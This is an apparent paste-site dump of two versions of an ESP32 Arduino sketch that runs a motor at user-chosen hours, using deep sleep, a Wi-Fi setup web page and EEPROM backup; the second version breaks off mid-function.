#define EEPROM_MAGIC_ADDR 0
#define EEPROM_SCHEDULE_ADDR 4
#define EEPROM_RUNTIME_ADDR 28
#define EEPROM_LAST_SYNC_ADDR 32
#define EEPROM_MAGIC_NUMBER 0xDEADBEEF
#define MAX_TIME_STALENESS 7 * 24 * 3600

const char *ssid = ""ESP32-Motor-Timer"";
const char *password = ""12345678"";

ESP32Time rtc(3600);
WiFiServer server(80);

// RTC memory variables
RTC_DATA_ATTR bool timeWasSet = false;
RTC_DATA_ATTR bool scheduleWasSet = false;
RTC_DATA_ATTR bool runTimeWasSet = false;
RTC_DATA_ATTR int bootCount = 0;
RTC_DATA_ATTR unsigned long webServerStartTime = 0;
RTC_DATA_ATTR bool usingBackupSettings = false;
RTC_DATA_ATTR bool hourlySchedule[24] = {0};
RTC_DATA_ATTR int motorRunTime = DEFAULT_MOTOR_ON_TIME;

struct EEPROMSettings {
  uint32_t magic;
  bool schedule[24];
  int runTime;
  uint32_t lastSyncTime;
};

void setup() {
  Serial.begin(115200);
  delay(1000);
  EEPROM.begin(EEPROM_SIZE);
  
  bootCount++;
  Serial.println(""Boot count: "" + String(bootCount));

  pinMode(MOTOR_PIN, OUTPUT);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(MOTOR_PIN, LOW);

  printWakeupReason();

  // Check if woken up by GPIO14 - clear EEPROM and reset
  if (esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_EXT0) {
    Serial.println(""=== GPIO RESET TRIGGERED ==="");
    Serial.println(""Clearing EEPROM settings..."");
    clearEEPROMSettings();
    
    // Reset RTC memory flags
    timeWasSet = false;
    scheduleWasSet = false;
    runTimeWasSet = false;
    usingBackupSettings = false;
    
    Serial.println(""EEPROM cleared - entering setup mode"");
    webServerStartTime = millis();
    setupWebServer();
    return;
  }

  // Normal wakeup logic
  if (timeWasSet && scheduleWasSet && runTimeWasSet && esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_TIMER) {
    handleScheduledWakeup();
  } else {
    if (tryLoadBackupSettings()) {
      Serial.println(""=== POWER FAILURE RECOVERY ==="");
      Serial.println(""Loaded backup settings from EEPROM"");
      printCurrentSettings();
      
      timeWasSet = false;
      usingBackupSettings = true;
      
      EEPROMSettings settings;
      loadSettingsFromEEPROM(settings);
      uint32_t currentEpoch = settings.lastSyncTime + (millis() / 1000);
      rtc.setTime(currentEpoch);
      timeWasSet = true;
      
      Serial.println(""Estimated time: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
      scheduleNextWakeup();
    } else {
      Serial.println(""No backup settings found - entering setup mode"");
      webServerStartTime = millis();
      setupWebServer();
    }
  }
}

void loop() {
  if (!timeWasSet || !scheduleWasSet || !runTimeWasSet) {
    if (millis() - webServerStartTime > 240000) {
      if (tryLoadBackupSettings()) {
        Serial.println(""Timeout reached - falling back to EEPROM settings"");
        usingBackupSettings = true;
        
        EEPROMSettings settings;
        loadSettingsFromEEPROM(settings);
        uint32_t estimatedTime = settings.lastSyncTime + (millis() / 1000);
        rtc.setTime(estimatedTime);
        timeWasSet = true;
        
        scheduleNextWakeup();
      } else {
        Serial.println(""No backup settings - entering 3-hour sleep"");
        setupSleepWakeup();
        esp_deep_sleep_start();
      }
    }
    handleWebClient();
  }
}

void clearEEPROMSettings() {
  // Clear magic number to invalidate settings
  uint32_t clearMagic = 0x00000000;
  EEPROM.put(EEPROM_MAGIC_ADDR, clearMagic);
  EEPROM.commit();
  Serial.println(""EEPROM settings cleared"");
}

bool tryLoadBackupSettings() {
  EEPROMSettings settings;
  if (loadSettingsFromEEPROM(settings)) {
    for (int i = 0; i < 24; i++) {
      hourlySchedule[i] = settings.schedule[i];
    }
    motorRunTime = settings.runTime;
    scheduleWasSet = true;
    runTimeWasSet = true;
    return true;
  }
  return false;
}

bool loadSettingsFromEEPROM(EEPROMSettings &settings) {
  uint32_t magic;
  EEPROM.get(EEPROM_MAGIC_ADDR, magic);
  
  if (magic != EEPROM_MAGIC_NUMBER) {
    Serial.println(""No valid EEPROM settings found"");
    return false;
  }

  EEPROM.get(EEPROM_MAGIC_ADDR, settings.magic);
  for (int i = 0; i < 24; i++) {
    settings.schedule[i] = EEPROM.read(EEPROM_SCHEDULE_ADDR + i);
  }
  EEPROM.get(EEPROM_RUNTIME_ADDR, settings.runTime);
  EEPROM.get(EEPROM_LAST_SYNC_ADDR, settings.lastSyncTime);
  
  if (settings.runTime < MIN_MOTOR_ON_TIME || settings.runTime > MAX_MOTOR_ON_TIME) {
    Serial.println(""Invalid run time in EEPROM: "" + String(settings.runTime));
    return false;
  }
  
  Serial.println(""Valid EEPROM settings loaded"");
  return true;
}

void saveSettingsToEEPROM() {
  Serial.println(""Saving settings to EEPROM..."");
  
  EEPROMSettings settings;
  settings.magic = EEPROM_MAGIC_NUMBER;
  
  for (int i = 0; i < 24; i++) {
    settings.schedule[i] = hourlySchedule[i];
  }
  settings.runTime = motorRunTime;
  settings.lastSyncTime = rtc.getEpoch();
  
  EEPROM.put(EEPROM_MAGIC_ADDR, settings.magic);
  for (int i = 0; i < 24; i++) {
    EEPROM.write(EEPROM_SCHEDULE_ADDR + i, settings.schedule[i]);
  }
  EEPROM.put(EEPROM_RUNTIME_ADDR, settings.runTime);
  EEPROM.put(EEPROM_LAST_SYNC_ADDR, settings.lastSyncTime);
  EEPROM.commit();
  
  Serial.println(""Settings saved to EEPROM successfully"");
  printCurrentSettings();
}

void printCurrentSettings() {
  Serial.println(""Current Settings:"");
  Serial.println(""- Motor run time: "" + String(motorRunTime) + "" seconds"");
  Serial.print(""- Schedule: "");
  
  int count = 0;
  for (int h = 0; h < 24; h++) {
    if (hourlySchedule[h]) {
      if (count > 0) Serial.print("", "");
      Serial.print(String(h < 10 ? ""0"" : """") + String(h) + "":00"");
      count++;
    }
  }
  
  if (count == 0) {
    Serial.println(""No hours scheduled"");
  } else {
    Serial.println("" ("" + String(count) + "" times/day)"");
    Serial.println(""- Total daily runtime: "" + String(count * motorRunTime) + "" seconds"");
  }
}

void handleScheduledWakeup() {
  Serial.println(""\n=== Scheduled Wake-up ==="");
  Serial.println(""Current time: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
  Serial.println(""Motor run time: "" + String(motorRunTime) + "" seconds"");
  
  if (usingBackupSettings) {
    Serial.println(""Running on backup settings from EEPROM"");
  }

  runMotor();
  scheduleNextWakeup();
}

void runMotor() {
  Serial.println(""Starting motor for "" + String(motorRunTime) + "" seconds..."");

  digitalWrite(LED_PIN, HIGH);
  digitalWrite(MOTOR_PIN, HIGH);

  for (int i = motorRunTime; i > 0; i--) {
    Serial.println(""Motor running... "" + String(i) + ""s remaining"");
    delay(1000);

    int blinkInterval = (motorRunTime < 10) ? 1 : 5;
    if (i % blinkInterval == 0) {
      digitalWrite(LED_PIN, LOW);
      delay(100);
      digitalWrite(LED_PIN, HIGH);
    }
  }

  digitalWrite(MOTOR_PIN, LOW);
  digitalWrite(LED_PIN, LOW);
  Serial.println(""Motor stopped."");
}

void setupSleepWakeup() {
  // Setup timer wakeup
  esp_sleep_enable_timer_wakeup(3 * 3600 * uS_TO_S_FACTOR);
  
  // Setup GPIO wakeup for reset functionality
  esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1); // 1 = High trigger
  rtc_gpio_pullup_dis(WAKEUP_GPIO);
  rtc_gpio_pulldown_en(WAKEUP_GPIO);
  Serial.println(""Setup ESP32 to wake up on GPIO14 trigger (reset mode)"");
}

void scheduleNextWakeup() {
  struct tm timeinfo = rtc.getTimeStruct();
  int currentHour = timeinfo.tm_hour;
  int currentMinute = timeinfo.tm_min;

  unsigned long sleepTime = calculateSleepTime(currentHour, currentMinute);

  if (sleepTime > 0) {
    Serial.println(""Next wake-up in "" + String(sleepTime / 3600) + "" hours and "" +
                   String((sleepTime % 3600) / 60) + "" minutes"");

    esp_sleep_enable_timer_wakeup(sleepTime * uS_TO_S_FACTOR);
    
    // Always enable GPIO wakeup for reset functionality
    esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1);
    rtc_gpio_pullup_dis(WAKEUP_GPIO);
    rtc_gpio_pulldown_en(WAKEUP_GPIO);
    
    Serial.println(""Entering deep sleep... (GPIO14 HIGH = reset)"");
    Serial.flush();
    esp_deep_sleep_start();
  } else {
    Serial.println(""No scheduled hours found - entering 24-hour sleep"");
    esp_sleep_enable_timer_wakeup(24 * 3600 * uS_TO_S_FACTOR);
    
    esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1);
    rtc_gpio_pullup_dis(WAKEUP_GPIO);
    rtc_gpio_pulldown_en(WAKEUP_GPIO);
    
    esp_deep_sleep_start();
  }
}

unsigned long calculateSleepTime(int currentHour, int currentMinute) {
  int nextHour = -1;

  for (int h = currentHour + 1; h < 24; h++) {
    if (hourlySchedule[h]) {
      nextHour = h;
      break;
    }
  }

  if (nextHour == -1) {
    for (int h = 0; h < 24; h++) {
      if (hourlySchedule[h]) {
        nextHour = h + 24;
        break;
      }
    }
  }

  if (nextHour == -1) return 0;

  int currentTotalMinutes = currentHour * 60 + currentMinute;
  int nextTotalMinutes = (nextHour % 24) * 60;

  if (nextHour >= 24) {
    nextTotalMinutes += 24 * 60;
  }

  int sleepMinutes = nextTotalMinutes - currentTotalMinutes;
  return sleepMinutes * 60;
}

void setupWebServer() {
  Serial.println(""\n=== Setting up Web Server for Configuration ==="");
  Serial.println(""Connect to WiFi network: "" + String(ssid));
  Serial.println(""Password: "" + String(password));
  Serial.println(""TIMEOUT: 4 minutes"");
  Serial.println(""RESET: Connect GPIO14 to 3.3V and reset ESP32"");

  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.println(""Web interface: http://"" + IP.toString());
  server.begin();

  for (int i = 0; i < 10; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }
}

void handleWebClient() {
  WiFiClient client = server.available();

  if (client) {
    Serial.println(""Client connected"");
    String currentLine = """";

    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        if (c == '\n') {
          if (currentLine.length() == 0) {
            sendWebPage(client);
            break;
          } else {
            currentLine = """";
          }
        } else if (c != '\r') {
          currentLine += c;
        }

        if (currentLine.endsWith(""POST /syncTime"")) {
          handleTimeSyncRequest(client);
        } else if (currentLine.endsWith(""POST /setRunTime"")) {
          handleRunTimeRequest(client);
        } else if (currentLine.endsWith(""POST /setSchedule"")) {
          handleScheduleRequest(client);
        }
      }
    }
    client.stop();
  }
}

// Simplified web page (keeping core functionality)
void sendWebPage(WiFiClient &client) {
  unsigned long elapsed = millis() - webServerStartTime;
  unsigned long remaining = (240000 - elapsed) / 1000;

  client.println(""HTTP/1.1 200 OK"");
  client.println(""Content-type:text/html"");
  client.println();
  client.println(""<!DOCTYPE html><html>"");
  client.println(""<head><title>ESP32 Motor Timer Setup</title>"");
  client.println(""<meta name='viewport' content='width=device-width, initial-scale=1'>"");
  client.println(""<style>"");
  client.println(""body{font-family:Arial;text-align:center;padding:20px;background:#f0f0f0;}"");
  client.println("".container{max-width:600px;margin:0 auto;background:white;padding:30px;border-radius:10px;}"");
  client.println(""input,button{padding:10px;margin:5px;font-size:16px;border:1px solid #ddd;border-radius:5px;}"");
  client.println(""button{background:#4CAF50;color:white;border:none;cursor:pointer;padding:15px 30px;}"");
  client.println("".timeout{color:red;font-weight:bold;}"");
  client.println("".step{margin:20px 0;padding:15px;background:#f9f9f9;border-radius:5px;}"");
  client.println("".schedule-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0;}"");
  client.println("".hour-checkbox{display:flex;align-items:center;padding:8px;background:white;border:1px solid #ddd;border-radius:5px;}"");
  client.println("".reset-info{background:#FFE6E6;padding:10px;border-radius:5px;margin:10px 0;border:1px solid #FF9999;}"");
  client.println(""</style></head>"");
  client.println(""<body>"");
  client.println(""<div class='container'>"");
  client.println(""<h1>ESP32 Motor Timer Setup</h1>"");
  
  client.println(""<div class='reset-info'>"");
  client.println(""<strong>Reset Instructions:</strong><br>"");
  client.println(""To clear settings: Connect GPIO14 to 3.3V and reset ESP32"");
  client.println(""</div>"");
  
  client.println(""<div class='timeout'>Timeout: <span id='countdown'>"" + String(remaining) + ""</span> seconds</div>"");

  // Step 1: Time sync
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 1: Set Current Time</h3>"");
  if (timeWasSet) {
    client.println(""<p>✅ Time set: "" + rtc.getTime(""%H:%M:%S %d/%m/%Y"") + ""</p>"");
  } else {
    client.println(""<h4 id='currentTime'></h4>"");
    client.println(""<form action='/syncTime' method='POST'>"");
    client.println(""<input type='hidden' name='epochTime' id='hiddenEpochTime'>"");
    client.println(""<button type='submit'>Sync Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 2: Motor run time
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 2: Set Motor Run Time</h3>"");
  if (runTimeWasSet) {
    client.println(""<p>✅ Run time set: "" + String(motorRunTime) + "" seconds</p>"");
  } else {
    client.println(""<form action='/setRunTime' method='POST'>"");
    client.println(""<input type='range' name='runTime' min='5' max='300' value='"" + String(motorRunTime) + ""'>"");
    client.println(""<span id='runTimeDisplay'>"" + String(motorRunTime) + ""s</span>"");
    client.println(""<button type='submit'>Set Run Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 3: Schedule
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 3: Select Operation Hours</h3>"");
  if (scheduleWasSet) {
    client.println(""<p>✅ Schedule set!</p>"");
  } else {
    client.println(""<form action='/setSchedule' method='POST'>"");
    client.println(""<div class='schedule-grid'>"");
    for (int h = 0; h < 24; h++) {
      client.println(""<div class='hour-checkbox'>"");
      client.println(""<input type='checkbox' name='hour"" + String(h) + ""' value='1'>"");
      client.println(""<label>"" + String(h < 10 ? ""0"" : """") + String(h) + "":00</label>"");
      client.println(""</div>"");
    }
    client.println(""</div>"");
    client.println(""<button type='submit'>Set Schedule</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  if (timeWasSet && scheduleWasSet && runTimeWasSet) {
    client.println(""<div class='step'>"");
    client.println(""<h3>✅ Setup Complete!</h3>"");
    client.println(""<p>ESP32 will now enter scheduled operation mode.</p>"");
    client.println(""<button onclick='startOperation()'>Start Operation</button>"");
    client.println(""</div>"");
  }

  client.println(""</div>"");

  // Simplified JavaScript
  client.println(""<script>"");
  client.println(""var countdown="" + String(remaining) + "";"");
  client.println(""function updateTime(){"");
  client.println(""var now=new Date();"");
  client.println(""if(document.getElementById('currentTime'))"");
  client.println(""document.getElementById('currentTime').innerHTML='Current Time: '+now.toLocaleString();"");
  client.println(""if(document.getElementById('hiddenEpochTime'))"");
  client.println(""document.getElementById('hiddenEpochTime').value=Math.floor(now.getTime()/1000);"");
  client.println(""}"");
  client.println(""function updateCountdown(){"");
  client.println(""countdown--;document.getElementById('countdown').innerHTML=countdown;"");
  client.println(""if(countdown<=0)document.body.innerHTML='<h2>Timeout reached</h2>';"");
  client.println(""}"");
  client.println(""function startOperation(){"");
  client.println(""document.body.innerHTML='<h2>Starting operation...</h2>';"");
  client.println(""}"");
  client.println(""setInterval(updateTime,1000);setInterval(updateCountdown,1000);updateTime();"");
  client.println(""</script></body></html>"");
}

void handleTimeSyncRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  int epochIndex = requestBody.indexOf(""epochTime="");
  if (epochIndex != -1) {
    long epochTime = requestBody.substring(epochIndex + 10).toInt();
    rtc.setTime(epochTime);
    timeWasSet = true;
    Serial.println(""Time synchronized: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
  }

  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void handleRunTimeRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  int runTimeIndex = requestBody.indexOf(""runTime="");
  if (runTimeIndex != -1) {
    int newRunTime = requestBody.substring(runTimeIndex + 8).toInt();
    if (newRunTime >= MIN_MOTOR_ON_TIME && newRunTime <= MAX_MOTOR_ON_TIME) {
      motorRunTime = newRunTime;
      runTimeWasSet = true;
      Serial.println(""Motor run time set to: "" + String(motorRunTime) + "" seconds"");
    }
  }

  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void handleScheduleRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  for (int h = 0; h < 24; h++) {
    hourlySchedule[h] = false;
  }

  for (int h = 0; h < 24; h++) {
    String hourParam = ""hour"" + String(h) + ""=1"";
    if (requestBody.indexOf(hourParam) != -1) {
      hourlySchedule[h] = true;
    }
  }

  scheduleWasSet = true;

  // Save to EEPROM when configuration is complete
  if (timeWasSet && scheduleWasSet && runTimeWasSet) {
    saveSettingsToEEPROM();
    delay(2000);
    scheduleNextWakeup();
  }

  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void printWakeupReason() {
  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();

  switch (wakeup_reason) {
    case ESP_SLEEP_WAKEUP_TIMER:
      Serial.println(""Wake-up: Scheduled timer"");
      break;
    case ESP_SLEEP_WAKEUP_EXT0:
      Serial.println(""Wake-up: GPIO14 external signal (RESET MODE)"");
      break;
    default:
      Serial.println(""Wake-up: Power on or reset"");
      break;
  }
}
"
DhZJ7ZLX,esp32_timer_ontime_24h,kodilivetv,C++,Thursday 12th of June 2025 12:55:55 PM CDT,"/*
   ESP32 Scheduled Motor Control with Deep Sleep - Hourly Scheduling with Configurable Run Time

   DESCRIPTION:
   This sketch creates an automated motor control system that runs a motor at user-selected
   hours of the day with user-configurable run time while maintaining ultra-low power 
   consumption between operations.

   FEATURES:
   • Allows selection of any hours (00:00-23:00) for motor operation via web interface
   • Configurable motor run time from 5 to 300 seconds (default: 5 seconds)
   • Uses deep sleep between operations for maximum battery efficiency
   • Web-based setup interface with 24 hourly checkboxes and run time slider
   • Built-in LED status indicators during setup and operation
   • RTC memory storage preserves settings through deep sleep cycles
   • Automatic timeout protection (enters sleep if no configuration within 4 minutes)

   HARDWARE REQUIREMENTS:
   • ESP32 development board
   • MOSFET (for motor control) connected to GPIO 33
   • Motor connected through MOSFET
   • Built-in LED on GPIO 2 (most ESP32 boards)
   • Optional: External RTC battery for better timekeeping

   SETUP PROCESS:
   1. Upload sketch to ESP32
   2. Connect to WiFi network ""ESP32-Motor-Timer"" (password: 12345678)
   3. Navigate to the IP address shown in Serial Monitor
   4. Sync current time from your browser
   5. Set desired motor run time (5-300 seconds)
   6. Check boxes for desired operation hours (e.g., 09:00, 19:00, 21:00)
   7. ESP32 automatically enters scheduled operation mode

   OPERATION:
   • ESP32 sleeps in deep sleep mode (uses ~10µA)
   • Wakes up at each selected hour
   • Runs motor for configured time with LED indication
   • Calculates next scheduled hour and returns to deep sleep
   • Cycle repeats based on selected schedule

   POWER CONSUMPTION:
   • Deep sleep: ~10µA (months of battery life)
   • Active operation: ~80mA for configured duration
   • Setup mode: ~150mA (4 minute timeout)

   TROUBLESHOOTING:
   • If setup doesn't complete, ESP32 sleeps for 3 hours then restarts setup
   • Press reset button to restart setup process
   • Check Serial Monitor (115200 baud) for debugging information
   • Time is automatically adjusted for Portuguese Summer Time (+1 hour)

   LIBRARIES REQUIRED:
   • ESP32Time (for RTC functionality)
   • WiFi (built-in ESP32 library)

   MIT License - Free to use and modify
   Based on ESP32Time library examples and ESP32 deep sleep functionality
*/

#include <ESP32Time.h>
#include <WiFi.h>

#define uS_TO_S_FACTOR 1000000ULL  // Conversion factor for micro seconds to seconds
#define DEFAULT_MOTOR_ON_TIME 5    // Default motor run time in seconds
#define MIN_MOTOR_ON_TIME 5        // Minimum motor run time in seconds
#define MAX_MOTOR_ON_TIME 300      // Maximum motor run time in seconds
#define MOTOR_PIN 33               // GPIO pin connected to MOSFET gate
#define LED_PIN 32                 // Built-in LED for status indication

// WiFi credentials for initial time sync
const char *ssid = ""ESP32-Motor-Timer"";
const char *password = ""12345678"";

//ESP32Time rtc;
ESP32Time rtc(3600);  // offset in seconds GMT+1 Portugal Summer Time
WiFiServer server(80);

// RTC memory variables (survive deep sleep)
RTC_DATA_ATTR bool timeWasSet = false;
RTC_DATA_ATTR bool scheduleWasSet = false;
RTC_DATA_ATTR bool runTimeWasSet = false;
RTC_DATA_ATTR int bootCount = 0;
RTC_DATA_ATTR unsigned long webServerStartTime = 0;

// Hourly schedule - 24 hour array (0=disabled, 1=enabled)
RTC_DATA_ATTR bool hourlySchedule[24] = {0}; // All hours disabled by default

// Motor run time configuration
RTC_DATA_ATTR int motorRunTime = DEFAULT_MOTOR_ON_TIME; // Run time in seconds

void setup() {
  Serial.begin(115200);
  delay(1000);

  bootCount++;
  Serial.println(""Boot count: "" + String(bootCount));

  // Initialize pins
  pinMode(MOTOR_PIN, OUTPUT);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(MOTOR_PIN, LOW);  // Ensure motor is off initially

  printWakeupReason();

  // Check if this is a scheduled wake-up and all settings have been configured
  if (timeWasSet && scheduleWasSet && runTimeWasSet && esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_TIMER) {
    handleScheduledWakeup();
  } else {
    // First boot, manual reset, or incomplete setup - need web interface
    webServerStartTime = millis();
    setupWebServer();
  }
}

void loop() {
  // Handle web server for time and schedule setting
  if (!timeWasSet || !scheduleWasSet || !runTimeWasSet) {
    // Check for 4-minute timeout
    if (millis() - webServerStartTime > 240000) { // 4 minutes = 240,000 ms
      Serial.println(""Web server timeout - entering 3-hour sleep to save battery"");
      esp_sleep_enable_timer_wakeup(3 * 3600 * uS_TO_S_FACTOR); // 3 hours
      esp_deep_sleep_start();
    }
    handleWebClient();
  }
}

void handleScheduledWakeup() {
  Serial.println(""\n=== Scheduled Wake-up ==="");
  Serial.println(""Current time: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));
  Serial.println(""Motor run time: "" + String(motorRunTime) + "" seconds"");

  // Run the motor
  runMotor();

  // Calculate next wake-up time
  scheduleNextWakeup();
}

void runMotor() {
  Serial.println(""Starting motor for "" + String(motorRunTime) + "" seconds..."");

  // Blink LED to indicate motor operation
  digitalWrite(LED_PIN, HIGH);

  // Turn on motor via MOSFET
  digitalWrite(MOTOR_PIN, HIGH);

  // Run for specified time with status updates
  for (int i = motorRunTime; i > 0; i--) {
    Serial.println(""Motor running... "" + String(i) + ""s remaining"");
    delay(1000);

    // Blink LED every 5 seconds during operation (or every second if run time < 10s)
    int blinkInterval = (motorRunTime < 10) ? 1 : 5;
    if (i % blinkInterval == 0) {
      digitalWrite(LED_PIN, LOW);
      delay(100);
      digitalWrite(LED_PIN, HIGH);
    }
  }

  // Turn off motor
  digitalWrite(MOTOR_PIN, LOW);
  digitalWrite(LED_PIN, LOW);

  Serial.println(""Motor stopped."");
}

void scheduleNextWakeup() {
  struct tm timeinfo = rtc.getTimeStruct();
  int currentHour = timeinfo.tm_hour;
  int currentMinute = timeinfo.tm_min;

  // Calculate seconds until next scheduled hour
  unsigned long sleepTime = calculateSleepTime(currentHour, currentMinute);

  if (sleepTime > 0) {
    Serial.println(""Next wake-up in "" + String(sleepTime / 3600) + "" hours and "" +
                   String((sleepTime % 3600) / 60) + "" minutes"");

    // Configure and enter deep sleep
    esp_sleep_enable_timer_wakeup(sleepTime * uS_TO_S_FACTOR);
    Serial.println(""Entering deep sleep..."");
    Serial.flush();
    esp_deep_sleep_start();
  } else {
    Serial.println(""No scheduled hours found - entering 24-hour sleep"");
    esp_sleep_enable_timer_wakeup(24 * 3600 * uS_TO_S_FACTOR); // 24 hours
    esp_deep_sleep_start();
  }
}

unsigned long calculateSleepTime(int currentHour, int currentMinute) {
  // Find next scheduled hour
  int nextHour = -1;

  // First, check if there are any hours scheduled later today
  for (int h = currentHour + 1; h < 24; h++) {
    if (hourlySchedule[h]) {
      nextHour = h;
      break;
    }
  }

  // If no hours found later today, check from beginning of next day
  if (nextHour == -1) {
    for (int h = 0; h < 24; h++) {
      if (hourlySchedule[h]) {
        nextHour = h + 24; // Add 24 to indicate next day
        break;
      }
    }
  }

  // If still no hours found, return 0 (no schedule set)
  if (nextHour == -1) {
    return 0;
  }

  // Calculate sleep time
  int currentTotalMinutes = currentHour * 60 + currentMinute;
  int nextTotalMinutes = (nextHour % 24) * 60; // Target minute is always 0

  // If next hour is tomorrow, add 24 hours worth of minutes
  if (nextHour >= 24) {
    nextTotalMinutes += 24 * 60;
  }

  int sleepMinutes = nextTotalMinutes - currentTotalMinutes;
  return sleepMinutes * 60; // Convert to seconds
}

void setupWebServer() {
  Serial.println(""\n=== Setting up Web Server for Configuration ==="");
  Serial.println(""Connect to WiFi network: "" + String(ssid));
  Serial.println(""Password: "" + String(password));
  Serial.println(""TIMEOUT: 4 minutes (will sleep for 3 hours if no configuration)"");

  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.println(""Web interface: http://"" + IP.toString());
  server.begin();

  // Blink LED to indicate setup mode
  for (int i = 0; i < 10; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }
}

void handleWebClient() {
  WiFiClient client = server.available();

  if (client) {
    Serial.println(""Client connected"");
    String currentLine = """";

    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        if (c == '\n') {
          if (currentLine.length() == 0) {
            sendWebPage(client);
            break;
          } else {
            currentLine = """";
          }
        } else if (c != '\r') {
          currentLine += c;
        }

        if (currentLine.endsWith(""POST /syncTime"")) {
          handleTimeSyncRequest(client);
        } else if (currentLine.endsWith(""POST /setRunTime"")) {
          handleRunTimeRequest(client);
        } else if (currentLine.endsWith(""POST /setSchedule"")) {
          handleScheduleRequest(client);
        }
      }
    }
    client.stop();
  }
}

void sendWebPage(WiFiClient &client) {
  // Calculate remaining time
  unsigned long elapsed = millis() - webServerStartTime;
  unsigned long remaining = (240000 - elapsed) / 1000; // seconds remaining

  client.println(""HTTP/1.1 200 OK"");
  client.println(""Content-type:text/html"");
  client.println();
  client.println(""<!DOCTYPE html><html>"");
  client.println(""<head><title>ESP32 Motor Timer Setup</title>"");
  client.println(""<meta name='viewport' content='width=device-width, initial-scale=1'>"");
  client.println(""<style>"");
  client.println(""body{font-family:Arial;text-align:center;padding:20px;background:#f0f0f0;}"");
  client.println("".container{max-width:600px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}"");
  client.println(""input,button{padding:10px;margin:5px;font-size:16px;border:1px solid #ddd;border-radius:5px;}"");
  client.println(""button{background:#4CAF50;color:white;border:none;cursor:pointer;padding:15px 30px;}"");
  client.println(""button:hover{background:#45a049;}"");
  client.println("".timeout{color:red;font-weight:bold;}"");
  client.println("".step{margin:20px 0;padding:15px;background:#f9f9f9;border-radius:5px;}"");
  client.println("".schedule-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin:20px 0;}"");
  client.println("".hour-checkbox{display:flex;align-items:center;padding:8px;background:white;border:1px solid #ddd;border-radius:5px;}"");
  client.println("".hour-checkbox input{margin-right:8px;}"");
  client.println("".hour-checkbox:hover{background:#f0f8ff;}"");
  client.println("".selected-hours{background:#e8f5e8;padding:10px;border-radius:5px;margin:10px 0;}"");
  client.println("".runtime-control{display:flex;align-items:center;justify-content:center;gap:15px;margin:15px 0;}"");
  client.println("".runtime-slider{width:200px;}"");
  client.println("".runtime-display{font-weight:bold;color:#2196F3;min-width:80px;}"");
  client.println(""</style></head>"");
  client.println(""<body>"");
  client.println(""<div class='container'>"");
  client.println(""<h1>ESP32 Motor Timer Setup</h1>"");
  client.println(""<div class='timeout'>Timeout: <span id='countdown'>"" + String(remaining) + ""</span> seconds</div>"");

  // Step 1: Time sync
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 1: Set Current Time</h3>"");
  if (timeWasSet) {
    client.println(""<p>✅ Time set: "" + rtc.getTime(""%H:%M:%S %d/%m/%Y"") + ""</p>"");
  } else {
    client.println(""<h4 id='currentTime'></h4>"");
    client.println(""<form action='/syncTime' method='POST'>"");
    client.println(""<input type='hidden' name='epochTime' id='hiddenEpochTime'>"");
    client.println(""<button type='submit'>Sync Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 2: Motor run time setup
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 2: Set Motor Run Time</h3>"");
  if (runTimeWasSet) {
    client.println(""<div class='selected-hours'>"");
    client.println(""<p>✅ Run time set: "" + String(motorRunTime) + "" seconds</p>"");
    client.println(""</div>"");
  } else {
    client.println(""<p>Set how long the motor should run each time (5-300 seconds):</p>"");
    client.println(""<form action='/setRunTime' method='POST'>"");
    client.println(""<div class='runtime-control'>"");
    client.println(""<label>5s</label>"");
    client.println(""<input type='range' name='runTime' id='runTimeSlider' class='runtime-slider' "");
    client.println(""min='"" + String(MIN_MOTOR_ON_TIME) + ""' max='"" + String(MAX_MOTOR_ON_TIME) + ""' "");
    client.println(""value='"" + String(motorRunTime) + ""' oninput='updateRunTimeDisplay(this.value)'>"");
    client.println(""<label>300s</label>"");
    client.println(""</div>"");
    client.println(""<div class='runtime-display' id='runTimeDisplay'>"" + String(motorRunTime) + "" seconds</div>"");
    client.println(""<button type='submit'>Set Run Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 3: Schedule setup
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 3: Select Operation Hours</h3>"");
  client.println(""<p>Check the boxes for hours when the motor should run:</p>"");

  if (scheduleWasSet) {
